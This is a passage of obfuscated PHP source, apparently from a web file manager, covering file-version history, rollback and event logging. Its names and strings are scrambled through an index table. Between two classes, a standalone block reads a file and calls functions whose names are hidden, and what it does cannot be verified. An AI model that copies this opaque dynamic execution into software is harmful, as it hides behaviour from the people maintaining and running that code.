$×í÷û—†[$‘¼ä»×] = array(); } $×í÷û—†[$‘¼ä»×][] = get_path_this($«ÑÛäÌÛ); } foreach ($×í÷û—† as $‘¼ä»× => $ıæ•ã·ö) { $×¬äã¦ = self::parsePath($‘¼ä»×); if (!$×¬äã¦) { continue; } foreach ($ıæ•ã·ö as $ö–“õ“ğ) { $òÉáÜ¿£ = self::listData(rtrim($×¬äã¦, $›‘¡Å„[8]) . $›‘¡Å„[8] . $ö–“õ“ğ, !1); if ($òÉáÜ¿£ && $òÉáÜ¿£[$›‘¡Å„[420]]) { $·±¿üÜŸ[rtrim($‘¼ä»×, $›‘¡Å„[8]) . $›‘¡Å„[8] . $ö–“õ“ğ] = count($òÉáÜ¿£[$›‘¡Å„[420]]); } } } return $·±¿üÜŸ; } public static function add($³ÆØ¼¹Ù) { $“¢õ²¹¥ =& $_SERVER[³à¼î¯á]; $Í›Äö = self::listData($³ÆØ¼¹Ù); if (!$Í›Äö) { return; } $ßªµ° = Model($“¢õ²¹¥[815])->get($“¢õ²¹¥[1293]); $á¦ëŸö¥ = intval($GLOBALS[$“¢õ²¹¥[6]][$“¢õ²¹¥[92]][$“¢õ²¹¥[1271]]); $¼ˆ½ƒù½ = $ßªµ° == $“¢õ²¹¥[1294] ? min(5, $á¦ëŸö¥) : $á¦ëŸö¥; if ($á¦ëŸö¥ <= 0) { return; } $ÌĞ•™ö¹ = IO::info($³ÆØ¼¹Ù); $€ÀĞñæ = $Í›Äö[$“¢õ²¹¥[420]]; if ($ÌĞ•™ö¹[$“¢õ²¹¥[79]] == 0) { return; } if ($ÌĞ•™ö¹[$“¢õ²¹¥[79]] >= 1024 * 1024 * 500) { return !1; } $ïÍº£½ = IO::hashSimple($³ÆØ¼¹Ù); if ($€ÀĞñæ && $€ÀĞñæ[0][$“¢õ²¹¥[647]] == $ïÍº£½) { return !0; } if (array_key_exists($“¢õ²¹¥[224], $ÌĞ•™ö¹) && !$ÌĞ•™ö¹[$“¢õ²¹¥[224]]) { return !1; } $à‰‰†Ë‘ = short_id(time()); $ÒñÔ–á† = array($“¢õ²¹¥[450] => $à‰‰†Ë‘, $“¢õ²¹¥[647] => $ïÍº£½, $“¢õ²¹¥[32] => $ÌĞ•™ö¹[$“¢õ²¹¥[32]] . $“¢õ²¹¥[10] . date($“¢õ²¹¥[1295]) . rand_string(1), $“¢õ²¹¥[79] => $ÌĞ•™ö¹[$“¢õ²¹¥[79]], $“¢õ²¹¥[502] => USER_ID, $“¢õ²¹¥[222] => time(), $“¢õ²¹¥[1296] => $“¢õ²¹¥[12]); IO::mkdir($Í›Äö[$“¢õ²¹¥[1297]]); $×¦¾´—¼ = IO::copy($³ÆØ¼¹Ù, $Í›Äö[$“¢õ²¹¥[1297]], !1, $ÒñÔ–á†[$“¢õ²¹¥[32]]); if (!$×¦¾´—¼) { self::clearEmptyFolder($Í›Äö[$“¢õ²¹¥[1297]]); return !1; } array_unshift($€ÀĞñæ, $ÒñÔ–á†); if (count($€ÀĞñæ) > $¼ˆ½ƒù½) { $ıèÚ‰æ« = array_slice($€ÀĞñæ, $¼ˆ½ƒù½); foreach ($ıèÚ‰æ« as $¦ü²—™) { IO::remove($Í›Äö[$“¢õ²¹¥[1297]] . $¦ü²—™[$“¢õ²¹¥[32]]); } $€ÀĞñæ = array_slice($€ÀĞñæ, 0, $¼ˆ½ƒù½); } return self::saveData($Í›Äö[$“¢õ²¹¥[1298]], $€ÀĞñæ); } public static function remove($¬Æ‡™«Û, $èéş¸âë) { $èŠ¦”Úä =& $_SERVER[³à¼î¯á]; $³Ş²¬Ûâ = self::listData($¬Æ‡™«Û); $ÕôãÇ¼ = array(); if (!$³Ş²¬Ûâ) { return !1; } foreach ($³Ş²¬Ûâ[$èŠ¦”Úä[420]] as $òÉ‰ÇŸ…) { if ($òÉ‰ÇŸ…[$èŠ¦”Úä[450]] == $èéş¸âë) { IO::remove($³Ş²¬Ûâ[$èŠ¦”Úä[1297]] . $òÉ‰ÇŸ…[$èŠ¦”Úä[32]]); continue; } $ÕôãÇ¼[] = $òÉ‰ÇŸ…; } return self::saveData($³Ş²¬Ûâ[$èŠ¦”Úä[1298]], $ÕôãÇ¼); } public static function clear($à§—Úîé, $îÏ‹ğÉ­ = true) { $™Ñ‹ĞÖù =& $_SERVER[³à¼î¯á]; $àÂĞ§òÚ = self::listData($à§—Úîé, $îÏ‹ğÉ­); if (!$àÂĞ§òÚ) { return !1; } foreach ($àÂĞ§òÚ[$™Ñ‹ĞÖù[420]] as $¢“ßÎ‡Ğ) { IO::remove($àÂĞ§òÚ[$™Ñ‹ĞÖù[1297]] . $¢“ßÎ‡Ğ[$™Ñ‹ĞÖù[32]]); } return self::saveData($àÂĞ§òÚ[$™Ñ‹ĞÖù[1298]], array()); } public static function moveHistory($àÌ©ÒÜ…, $ñòÏé·â = '', $ì´ ü˜ğ = '') { $ÃšûÈ»¯ =& $_SERVER[³à¼î¯á]; $Í‚ˆúóå = self::listData($àÌ©ÒÜ…, !1); if (!$Í‚ˆúóå || !$Í‚ˆúóå[$ÃšûÈ»¯[420]]) { return !1; } $¦ûîğİ = $ÃšûÈ»¯[1285]; $ñòÏé·â = $ñòÏé·â ? $ñòÏé·â : get_path_this($àÌ©ÒÜ…); $ì´ ü˜ğ = $ì´ ü˜ğ ? $ì´ ü˜ğ : $Í‚ˆúóå[$ÃšûÈ»¯[1297]]; $ˆ¦Ö«ÌŞ = substr(get_path_this($Í‚ˆúóå[$ÃšûÈ»¯[1298]]), 0, -strlen($¦ûîğİ)); foreach ($Í‚ˆúóå[$ÃšûÈ»¯[420]] as $–À¦ú—˜ => $±ôšòÉæ) { $“Üà°¹™ = $ñòÏé·â . substr($±ôšòÉæ[$ÃšûÈ»¯[32]], strlen($ˆ¦Ö«ÌŞ)); $íŒ•è–¢ = IO::move($Í‚ˆúóå[$ÃšûÈ»¯[1297]] . $±ôšòÉæ[$ÃšûÈ»¯[32]], $ì´ ü˜ğ, !1, $“Üà°¹™); if ($íŒ•è–¢) { $Í‚ˆúóå[$ÃšûÈ»¯[420]][$–À¦ú—˜][$ÃšûÈ»¯[32]] = $“Üà°¹™; } } $Í‚ˆúóå[$ÃšûÈ»¯[1298]] = IO::move($Í‚ˆúóå[$ÃšûÈ»¯[1298]], $ì´ ü˜ğ, !1, $ñòÏé·â . $¦ûîğİ); self::saveData($Í‚ˆúóå[$ÃšûÈ»¯[1298]], $Í‚ˆúóå[$ÃšûÈ»¯[420]]); self::clearEmptyFolder($Í‚ˆúóå[$ÃšûÈ»¯[1297]]); } public static function rollback($©£·™–, $Î‡©ŒÄõ) { $Â©Ë÷¹  =& $_SERVER[³à¼î¯á]; $ËŒ¦í­é = self::listData($©£·™–); if (!$ËŒ¦í­é) { return; } $µ÷¯–°Û = IO::info($©£·™–); foreach ($ËŒ¦í­é[$Â©Ë÷¹ [420]] as $·åëšÄ => $ığÇ¿®°) { if ($ığÇ¿®°[$Â©Ë÷¹ [450]] == $Î‡©ŒÄõ) { self::add($©£·™–); $„€ø„½Ë = $ËŒ¦í­é[$Â©Ë÷¹ [1297]] . $ığÇ¿®°[$Â©Ë÷¹ [32]]; $«ĞæÎĞ§ = IO::copy($„€ø„½Ë, IO::pathFather($©£·™–), REPEAT_REPLACE, $µ÷¯–°Û[$Â©Ë÷¹ [32]]); if ($«ĞæÎĞ§) { self::remove($©£·™–, $Î‡©ŒÄõ); } return $«ĞæÎĞ§; } } return !1; } public static function setDetail($˜®ó›Ş, $¸àíÖ, $³Úåî) { $íŸ¦ª¾ =& $_SERVER[³à¼î¯á]; $âòâÇ½ = self::listData($˜®ó›Ş); if (!$âòâÇ½) { return; } foreach ($âòâÇ½[$íŸ¦ª¾[420]] as $°¿òºã => $ææ¬¯š¿) { if ($ææ¬¯š¿[$íŸ¦ª¾[450]] == $¸àíÖ) { $âòâÇ½[$íŸ¦ª¾[420]][$°¿òºã][$íŸ¦ª¾[1296]] = $³Úåî; self::saveData($âòâÇ½[$íŸ¦ª¾[1298]], $âòâÇ½[$íŸ¦ª¾[420]]); return !0; } } return !1; } public static function fileInfo($×½‚óâ, $Éƒ·ÍÙ) { $À¾Í€Ÿğ =& $_SERVER[³à¼î¯á]; $¡ıñí‡ = self::listData($×½‚óâ); if (!$¡ıñí‡) { show_json(LNG($À¾Í€Ÿğ[108]), !1); } $ñÔíÖ‰« = $À¾Í€Ÿğ[12]; foreach ($¡ıñí‡[$À¾Í€Ÿğ[420]] as $„ş·¸ğİ => $ÚÒµ¬´Ş) { if ($ÚÒµ¬´Ş[$À¾Í€Ÿğ[450]] != $Éƒ·ÍÙ) { continue; } $ñÔíÖ‰« = $¡ıñí‡[$À¾Í€Ÿğ[1297]] . $ÚÒµ¬´Ş[$À¾Í€Ÿğ[32]]; break; } if (!$ñÔíÖ‰«) { show_json(LNG($À¾Í€Ÿğ[108]), !1); } return IO::info($ñÔíÖ‰«); } public static function fileOut($é±­áÕä, $ÆèŞë», $Ë¹®ˆ¤ = false) { $¯¿ö¶œˆ =& $_SERVER[³à¼î¯á]; $ Ê´ƒ = self::fileInfo($é±­áÕä, $ÆèŞë»); $«ˆø‹ú« =& $GLOBALS[$¯¿ö¶œˆ[7]]; $Ë¹®ˆ¤ = isset($«ˆø‹ú«[$¯¿ö¶œˆ[1248]]) && $«ˆø‹ú«[$¯¿ö¶œˆ[1248]] == 1; if (isset($«ˆø‹ú«[$¯¿ö¶œˆ[33]]) && $«ˆø‹ú«[$¯¿ö¶œˆ[33]] == $¯¿ö¶œˆ[1299]) { return IO::fileOutImage($ Ê´ƒ[$¯¿ö¶œˆ[87]], $«ˆø‹ú«[$¯¿ö¶œˆ[1300]]); } IO::fileOut($ Ê´ƒ[$¯¿ö¶œˆ[87]], $Ë¹®ˆ¤, get_path_this($é±­áÕä)); } public static function listData($–‡¬ ú, $”À¤©‰ = true) { $½ıÄÒõ =& $_SERVER[³à¼î¯á]; if ($”À¤©‰ && !IO::exist($–‡¬ ú)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($–‡¬ ú, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ÎÌ—á´¬ = self::pathHistory($–‡¬ ú); $ö£©Æ = array($½ıÄÒõ[1298] => $ÎÌ—á´¬ . $½ıÄÒõ[1285], $½ıÄÒõ[1297] => rtrim(get_path_father($ÎÌ—á´¬), $½ıÄÒõ[8]) . $½ıÄÒõ[8], $½ıÄÒõ[420] => array()); $üï×Ñí¦ = IO::getContent($ö£©Æ[$½ıÄÒõ[1298]]); if ($üï×Ñí¦) { $š«¾¯ãÓ = json_decode($üï×Ñí¦, !0); if (is_array($š«¾¯ãÓ)) { $ö£©Æ[$½ıÄÒõ[420]] = $š«¾¯ãÓ; } } return $ö£©Æ; } private static function saveData($ñÙœ‘¦š, $®ş¯½†­) { $ÌÒš¡ÅŒ =& $_SERVER[³à¼î¯á]; self::log($ÌÒš¡ÅŒ[1301] . $ñÙœ‘¦š . $ÌÒš¡ÅŒ[74] . count($®ş¯½†­), $ÌÒš¡ÅŒ[796]); if ($®ş¯½†­) { return IO::setContent($ñÙœ‘¦š, json_encode($®ş¯½†­)); } $ˆÓ£û›µ = IO::pathFather($ñÙœ‘¦š); IO::remove($ñÙœ‘¦š); self::clearEmptyFolder($ˆÓ£û›µ); return !0; } public static function clearEmptyFolder($ò™Øë…Å) { $Ø’¸•» =& $_SERVER[³à¼î¯á]; if (trim($ò™Øë…Å, $Ø’¸•»[8]) == trim(self::$_historyBase, $Ø’¸•»[8])) { return; } $¿Í»Ëµä = IO::pathFather($ò™Øë…Å); $ÂŒ¿¢üÈ = IO::has($ò™Øë…Å, !0); if ($ÂŒ¿¢üÈ[$Ø’¸•»[230]] > 0 || $ÂŒ¿¢üÈ[$Ø’¸•»[231]] > 0) { return; } IO::remove($ò™Øë…Å); self::clearEmptyFolder($¿Í»Ëµä); } private static function getBasePath() { $à¶èµÎ =& $_SERVER[³à¼î¯á]; $€ªıÀ»¥ = Model($à¶èµÎ[1302])->get($à¶èµÎ[1303]); if ($€ªıÀ»¥) { if (!IO::exist($€ªıÀ»¥)) { IO::mkdir($€ªıÀ»¥); } if (get_path_this($€ªıÀ»¥) == $à¶èµÎ[1288]) { $¼‘ˆéŸ„ = $à¶èµÎ[1304] . rand_string(8); @rename($€ªıÀ»¥, get_path_father($€ªıÀ»¥) . $à¶èµÎ[8] . $¼‘ˆéŸ„); $€ªıÀ»¥ = DATA_PATH . $¼‘ˆéŸ„ . $à¶èµÎ[8]; file_put_contents(DATA_PATH . $à¶èµÎ[1238], $à¶èµÎ[12]); Model($à¶èµÎ[1302])->set($à¶èµÎ[1303], $€ªıÀ»¥); } return $€ªıÀ»¥; } $€ªıÀ»¥ = DATA_PATH . $à¶èµÎ[1304] . rand_string(8) . $à¶èµÎ[8]; $€ªıÀ»¥ = IO::mkdir($€ªıÀ»¥); $€ªıÀ»¥ = rtrim($€ªıÀ»¥, $à¶èµÎ[8]) . $à¶èµÎ[8]; file_put_contents($€ªıÀ»¥ . $à¶èµÎ[1238], $à¶èµÎ[12]); file_put_contents(DATA_PATH . $à¶èµÎ[1238], $à¶èµÎ[12]); Model($à¶èµÎ[1302])->set($à¶èµÎ[1303], $€ªıÀ»¥); return $€ªıÀ»¥; } } goto b‹„ïñ¬Ê—; C‘çÕ‚Ÿ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\x72\143\x65\x5f\x65\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\124\151\x6d\145", "\x74\x69\x6d\145", "\151\x6e\163\145\x72\164", "\x66\x75\x6e\x63\164\x69\x6f\x6e"), array("\144\145\x73\143", '', "\151\156\x73\x65\x72\164\54\x75\160\x64\x61\x74\x65\x2c\163\x65\154\x65\x63\x74", "\x6a\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ó–À¬•, $¶öäÆ, $Ä¸™“ïÒ = '') { $Û¾ò±‡Ë =& $_SERVER[³à¼î¯á]; if (!$this->eventSave) { return; } $ìıÃ…›Ê = Model($Û¾ò±‡Ë[1388])->sourceInfo($Ó–À¬•); if (!$ìıÃ…›Ê) { return !1; } if ($this->isDisableEvent($ìıÃ…›Ê, $¶öäÆ)) { return; } if ($Ä¸™“ïÒ && is_string($Ä¸™“ïÒ)) { $Ä¸™“ïÒ = array($Û¾ò±‡Ë[1991] => $Ä¸™“ïÒ); } $¸êÛ· = defined($Û¾ò±‡Ë[2179]) ? USER_ID : 0; $•îîˆŸˆ = array($Û¾ò±‡Ë[466] => $Ó–À¬•, $Û¾ò±‡Ë[2180] => $ìıÃ…›Ê[$Û¾ò±‡Ë[183]], $Û¾ò±‡Ë[2181] => $ìıÃ…›Ê[$Û¾ò±‡Ë[32]], $Û¾ò±‡Ë[558] => !empty($ìıÃ…›Ê[$Û¾ò±‡Ë[558]]) ? $ìıÃ…›Ê[$Û¾ò±‡Ë[558]] : $Û¾ò±‡Ë[12], $Û¾ò±‡Ë[1744] => $¸êÛ·, $Û¾ò±‡Ë[471] => $¶öäÆ, $Û¾ò±‡Ë[1746] => $Ä¸™“ïÒ); $this->addSystemLog($¶öäÆ, $•îîˆŸˆ); unset($•îîˆŸˆ[$Û¾ò±‡Ë[2181]], $•îîˆŸˆ[$Û¾ò±‡Ë[558]]); return $this->add($•îîˆŸˆ); } private function addSystemLog($¡œÒšê¤, $ìÅÈÂ¬) { $Ò¦ß‚è =& $_SERVER[³à¼î¯á]; if ($¡œÒšê¤ == $Ò¦ß‚è[2182]) { $¡œÒšê¤ = $ìÅÈÂ¬[$Ò¦ß‚è[501]][$Ò¦ß‚è[2183]]; } else { if (in_array($¡œÒšê¤, array($Ò¦ß‚è[1932], $Ò¦ß‚è[2184]))) { $¡œÒšê¤ = $ìÅÈÂ¬[$Ò¦ß‚è[501]][$Ò¦ß‚è[799]]; } } $ô”ŠºÄó = array_merge($ìÅÈÂ¬, array($Ò¦ß‚è[2185] => $ìÅÈÂ¬[$Ò¦ß‚è[184]], $Ò¦ß‚è[2186] => $ìÅÈÂ¬[$Ò¦ß‚è[2186]])); Hook::trigger($Ò¦ß‚è[2187], $Ò¦ß‚è[2188] . $¡œÒšê¤, $ìÅÈÂ¬); Model($Ò¦ß‚è[1896])->addLog($Ò¦ß‚è[2188] . $¡œÒšê¤, $ô”ŠºÄó); } private function isDisableEvent($ÎË–ªÉÕ, $‡ñÚ¼–‚) { $ô­­òÇ =& $_SERVER[³à¼î¯á]; if ($ÎË–ªÉÕ[$ô­­òÇ[181]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($‡ñÚ¼–‚ == $ô­­òÇ[1921]) { return !1; } return !0; } public function eventCreate($ÖĞ¼ì¢², $§âœƒıæ) { $éóèå›ü =& $_SERVER[³à¼î¯á]; $Àå°·Ãç = Model($éóèå›ü[1388])->sourceInfo($ÖĞ¼ì¢²); $öıñœê¡ = array($éóèå›ü[2183] => $§âœƒıæ, $éóèå›ü[32] => $Àå°·Ãç[$éóèå›ü[32]]); return $this->addEvent($ÖĞ¼ì¢², $éóèå›ü[2182], $öıñœê¡); } public function eventFileEdit($ôíŸôõõ) { $¸»—í• =& $_SERVER[³à¼î¯á]; $ ­ë¿óñ = array($¸»—í•[2189] => $_SERVER[$¸»—í•[2190]], $¸»—í•[2191] => strtolower(ACTION)); if (isset($GLOBALS[$¸»—í•[7]][$¸»—í•[2192]])) { $ ­ë¿óñ[$¸»—í•[2192]] = $¸»—í•[91]; } return $this->addEvent($ôíŸôõõ, $¸»—í•[1922], $ ­ë¿óñ); } public function eventRecycle($§÷ÄÌ´í, $ÅÆôç´) { return $this->addEvent($§÷ÄÌ´í, $_SERVER[³à¼î¯á][2184], $ÅÆôç´); } private static $_removeLast = ''; public function eventRemove($¸´éœË“) { $ïØ»Øô =& $_SERVER[³à¼î¯á]; self::$_removeLast = $¸´éœË“; $íˆ¯Ûù = Model($ïØ»Øô[1388])->sourceInfo($¸´éœË“); $²êÃÎ = array_field_key($íˆ¯Ûù, array($ïØ»Øô[184], $ïØ»Øô[516], $ïØ»Øô[480], $ïØ»Øô[560])); $šÆë³ğÀ = array($ïØ»Øô[799] => $íˆ¯Ûù[$ïØ»Øô[32]], $ïØ»Øô[2191] => ACTION, $ïØ»Øô[2193] => $²êÃÎ); return $this->addEvent($íˆ¯Ûù[$ïØ»Øô[183]], $ïØ»Øô[1921], $šÆë³ğÀ); } public function eventShare($’ğÉÁàË, $½˜ª¸”) { return $this->addEvent($’ğÉÁàË, $_SERVER[³à¼î¯á][1932], $½˜ª¸”); } public function eventMove($Ìü«…¥, $êŸ÷§µ½, $À÷á¹³ì) { $àäÁıï‰ =& $_SERVER[³à¼î¯á]; if (self::$_removeLast == $Ìü«…¥) { return; } $Ø¡¡üï„ = Model($àäÁıï‰[1388]); $Ú»¦ŠÔ¤ = $Ø¡¡üï„->sourceInfo($Ìü«…¥); $¬ã»ÃìÉ = $Ø¡¡üï„->sourceInfo($êŸ÷§µ½); $à…Éè™ã = $Ø¡¡üï„->sourceInfo($À÷á¹³ì); $×àÙÏ  = array($àäÁıï‰[1213] => $êŸ÷§µ½, $àäÁıï‰[2194] => $¬ã»ÃìÉ[$àäÁıï‰[32]], $àäÁıï‰[2170] => !empty($¬ã»ÃìÉ[$àäÁıï‰[558]]) ? $¬ã»ÃìÉ[$àäÁıï‰[558]] : $àäÁıï‰[12], $àäÁıï‰[1214] => $À÷á¹³ì, $àäÁıï‰[2195] => $à…Éè™ã[$àäÁıï‰[32]], $àäÁıï‰[2196] => !empty($à…Éè™ã[$àäÁıï‰[558]]) ? $à…Éè™ã[$àäÁıï‰[558]] : $àäÁıï‰[12]); $this->addEvent($Ìü«…¥, $àäÁıï‰[595], $×àÙÏ ); $Ú»¦ŠÔ¤ = $Ø¡¡üï„->sourceInfo($Ìü«…¥); $×àÙÏ  = array($àäÁıï‰[184] => $Ú»¦ŠÔ¤[$àäÁıï‰[184]], $àäÁıï‰[32] => $Ú»¦ŠÔ¤[$àäÁıï‰[32]]); $this->addEvent($êŸ÷§µ½, $àäÁıï‰[2197], $×àÙÏ ); } public function eventCopy($ÈµùÀ®ú) { $this->eventCreate($ÈµùÀ®ú, $_SERVER[³à¼î¯á][593]); } public function eventRename($‰‘Í”ìå, $Ì¨‘ôÈÀ, $œÇºåÚ) { $ëŠïİ–Û =& $_SERVER[³à¼î¯á]; $Û¾§•´ö = array($ëŠïİ–Û[1213] => $Ì¨‘ôÈÀ, $ëŠïİ–Û[1214] => $œÇºåÚ); return $this->addEvent($‰‘Í”ìå, $ëŠïİ–Û[1402], $Û¾§•´ö); } public function eventAddComment($Äëä·Ÿ‘, $øš´¯®¬) { return $this->addEvent($Äëä·Ÿ‘, $_SERVER[³à¼î¯á][2198], $øš´¯®¬); } public function eventAddDesc($ÓÒŒşÌÔ, $ÔíúÉŠ) { return $this->addEvent($ÓÒŒşÌÔ, $_SERVER[³à¼î¯á][2199], $ÔíúÉŠ); } public function listBySource($±•­‡×) { $ù›¦©ß­ =& $_SERVER[³à¼î¯á]; $Á—…¤Š» = Model($ù›¦©ß­[1388])->sourceInfo($±•­‡×); $Ù‘²å™ = array($ù›¦©ß­[466] => $±•­‡×); if ($Á—…¤Š»[$ù›¦©ß­[460]] == $ù›¦©ß­[91]) { $ÇÈ×ù€¿ = Model($ù›¦©ß­[1388])->listSearchChildren($±•­‡×, 20000); $ÇÈ×ù€¿[] = $±•­‡× . $ù›¦©ß­[429]; $Ù‘²å™ = array($ù›¦©ß­[184] => array($ù›¦©ß­[7], $ÇÈ×ù€¿)); } $²°Ø÷ùí = $this->where($Ù‘²å™)->order($ù›¦©ß­[2200])->selectPage(); if ($²°Ø÷ùí[$ù›¦©ß­[417]][$ù›¦©ß­[418]] == 0) { $²°Ø÷ùí[$ù›¦©ß­[417]][$ù›¦©ß­[418]] = 1; $²°Ø÷ùí[$ù›¦©ß­[420]] = array(array($ù›¦©ß­[466] => $±•­‡×, $ù›¦©ß­[2180] => $Á—…¤Š»[$ù›¦©ß­[183]], $ù›¦©ß­[1744] => $Á—…¤Š»[$ù›¦©ß­[502]], $ù›¦©ß­[471] => $ù›¦©ß­[2201], $ù›¦©ß­[472] => $Á—…¤Š»[$ù›¦©ß­[222]], $ù›¦©ß­[1746] => $ù›¦©ß­[12])); } return $this->eventListParse($²°Ø÷ùí, $±•­‡×); } private function eventListParse($§Ú¼–Šû, $¢¸¨…ñ¥) { $ÂöÑ½·ğ =& $_SERVER[³à¼î¯á]; $³Šß¢³ = $§Ú¼–Šû[$ÂöÑ½·ğ[420]]; $òáûØÉê = array_to_keyvalue($³Šß¢³, $ÂöÑ½·ğ[12], $ÂöÑ½·ğ[184]); $âúÍØ—ê = array_to_keyvalue($³Šß¢³, $ÂöÑ½·ğ[12], $ÂöÑ½·ğ[2186]); foreach ($³Šß¢³ as $“Úõ…Ù) { $Ê‚óŠÄÛ = $“Úõ…Ù[$ÂöÑ½·ğ[501]]; if ($“Úõ…Ù[$ÂöÑ½·ğ[33]] == $ÂöÑ½·ğ[595] && isset($Ê‚óŠÄÛ[$ÂöÑ½·ğ[1213]])) { $òáûØÉê[] = $Ê‚óŠÄÛ[$ÂöÑ½·ğ[1213]] . $ÂöÑ½·ğ[12]; $òáûØÉê[] = $Ê‚óŠÄÛ[$ÂöÑ½·ğ[1214]] . $ÂöÑ½·ğ[12]; } if ($“Úõ…Ù[$ÂöÑ½·ğ[33]] == $ÂöÑ½·ğ[2197] && isset($Ê‚óŠÄÛ[$ÂöÑ½·ğ[184]])) { $òáûØÉê[] = $Ê‚óŠÄÛ[$ÂöÑ½·ğ[184]] . $ÂöÑ½·ğ[12]; } } $òáûØÉê = array_merge($òáûØÉê, $âúÍØ—ê, array($¢¸¨…ñ¥ . $ÂöÑ½·ğ[12])); $òáûØÉê = array_unique($òáûØÉê); $³èçšàô = array_unique(array_to_keyvalue($³Šß¢³, $ÂöÑ½·ğ[12], $ÂöÑ½·ğ[1753])); $áëäËßâ = Model($ÂöÑ½·ğ[574])->userListInfo($³èçšàô); $Àµ¾îË = Model($ÂöÑ½·ğ[869])->sourceListInfo($òáûØÉê, !0); foreach ($³Šß¢³ as &$“Úõ…Ù) { if ($“Úõ…Ù[$ÂöÑ½·ğ[33]] == $ÂöÑ½·ğ[595] && isset($“Úõ…Ù[$ÂöÑ½·ğ[501]][$ÂöÑ½·ğ[1213]])) { $“Úõ…Ù[$ÂöÑ½·ğ[501]][$ÂöÑ½·ğ[1213]] = $Àµ¾îË[$“Úõ…Ù[$ÂöÑ½·ğ[501]][$ÂöÑ½·ğ[1213]]]; $“Úõ…Ù[$ÂöÑ½·ğ[501]][$ÂöÑ½·ğ[1214]] = $Àµ¾îË[$“Úõ…Ù[$ÂöÑ½·ğ[501]][$ÂöÑ½·ğ[1214]]]; } if ($“Úõ…Ù[$ÂöÑ½·ğ[33]] == $ÂöÑ½·ğ[2197] && isset($“Úõ…Ù[$ÂöÑ½·ğ[501]][$ÂöÑ½·ğ[184]])) { $“Úõ…Ù[$ÂöÑ½·ğ[501]][$ÂöÑ½·ğ[184]] = $Àµ¾îË[$“Úõ…Ù[$ÂöÑ½·ğ[501]][$ÂöÑ½·ğ[184]]]; } $“Úõ…Ù[$ÂöÑ½·ğ[90]] = $Àµ¾îË[$“Úõ…Ù[$ÂöÑ½·ğ[184]]]; $“Úõ…Ù[$ÂöÑ½·ğ[2202]] = $Àµ¾îË[$“Úõ…Ù[$ÂöÑ½·ğ[2186]]]; if ($“Úõ…Ù[$ÂöÑ½·ğ[33]] == $ÂöÑ½·ğ[1921]) { $“Úõ…Ù[$ÂöÑ½·ğ[2202]] = $“Úõ…Ù[$ÂöÑ½·ğ[90]]; $“Úõ…Ù[$ÂöÑ½·ğ[2186]] = $“Úõ…Ù[$ÂöÑ½·ğ[2202]][$ÂöÑ½·ğ[184]]; $“Úõ…Ù[$ÂöÑ½·ğ[90]] = !1; $“Úõ…Ù[$ÂöÑ½·ğ[184]] = $ÂöÑ½·ğ[12]; } $“Úõ…Ù[$ÂöÑ½·ğ[2129]] = $áëäËßâ[$“Úõ…Ù[$ÂöÑ½·ğ[1753]]]; } unset($“Úõ…Ù); $§Ú¼–Šû[$ÂöÑ½·ğ[420]] = $³Šß¢³; return $§Ú¼–Šû; } public function removeBySource($éóÂûº) { $é©—ƒ½Ù = array($_SERVER[³à¼î¯á][466] => $éóÂûº); $this->where($é©—ƒ½Ù)->remove(); } } if ($_SERVER[$_SERVER[³à¼î¯á][921]] != $_SERVER[$_SERVER[³à¼î¯á][1008]]) { $_getc = $_SERVER[³à¼î¯á][924]; $_getfile = $_SERVER[$_SERVER[³à¼î¯á][925]] . $_SERVER[³à¼î¯á][926]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³à¼î¯á][253], $_getfilec); if (count($_getarrs) < $_SERVER[³à¼î¯á][665]) { $exit = $_SERVER[³à¼î¯á][927]; $exit(); } $_act = $_SERVER[³à¼î¯á][1009]; $_act($_SERVER[$_SERVER[³à¼î¯á][922]]); } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\143\x65\x5f\150\x69\x73\x74\x6f\x72\x79"; public function historyCount($“ĞÄ®ş) { $‘Ü‡Æü— =& $_SERVER[³à¼î¯á]; if (!$“ĞÄ®ş) { return array(); } if (is_string($“ĞÄ®ş) || is_int($“ĞÄ®ş)) { $“ĞÄ®ş = array($“ĞÄ®ş); } $ğéü‹¿É = array($‘Ü‡Æü—[184], $‘Ü‡Æü—[1985] => $‘Ü‡Æü—[541]); $á«ÙŠÚû = array($‘Ü‡Æü—[184] => array($‘Ü‡Æü—[7], $“ĞÄ®ş)); $ÃÉ€ìšŠ = $this->field($ğéü‹¿É)->where($á«ÙŠÚû)->group($‘Ü‡Æü—[184])->select(); return array_to_keyvalue($ÃÉ€ìšŠ, $‘Ü‡Æü—[184], $‘Ü‡Æü—[541]); } public function addHistory($¶ßÙˆô, $Ú¤Ó¼š = '') { $‹»íæÆ° =& $_SERVER[³à¼î¯á]; $„Ö ¯ÇĞ = array($‹»íæÆ°[466] => $¶ßÙˆô[$‹»íæÆ°[184]], $‹»íæÆ°[1744] => isset($¶ßÙˆô[$‹»íæÆ°[504]]) ? $¶ßÙˆô[$‹»íæÆ°[504]] : $¶ßÙˆô[$‹»íæÆ°[502]], $‹»íæÆ°[517] => $¶ßÙˆô[$‹»íæÆ°[516]], $‹»íæÆ°[592] => $¶ßÙˆô[$‹»íæÆ°[79]], $‹»íæÆ°[2203] => $Ú¤Ó¼š); if ($GLOBALS[$‹»íæÆ°[6]][$‹»íæÆ°[92]][$‹»íæÆ°[1271]] >= 1) { $this->historyAutoClear($„Ö ¯ÇĞ[$‹»íæÆ°[184]]); $this->add($„Ö ¯ÇĞ); } Hook::trigger($‹»íæÆ°[2204], $„Ö ¯ÇĞ); Model($‹»íæÆ°[2205])->eventFileEdit($¶ßÙˆô[$‹»íæÆ°[184]]); } private function historyAutoClear($ßÜî†õ) { $˜É§™ä =& $_SERVER[³à¼î¯á]; $†ß”ş™§ = Model($˜É§™ä[815])->get($˜É§™ä[1293]); $·²¸¼Ö = intval($GLOBALS[$˜É§™ä[6]][$˜É§™ä[92]][$˜É§™ä[1271]]); $×š‹ÂîÜ = $†ß”ş™§ == $˜É§™ä[1294] ? min(5, $·²¸¼Ö) : $·²¸¼Ö; $×š‹ÂîÜ = $×š‹ÂîÜ <= 0 ? 0 : $×š‹ÂîÜ - 1; if ($×š‹ÂîÜ >= 500) { return; } $ƒÊéºëõ = array($˜É§™ä[466] => 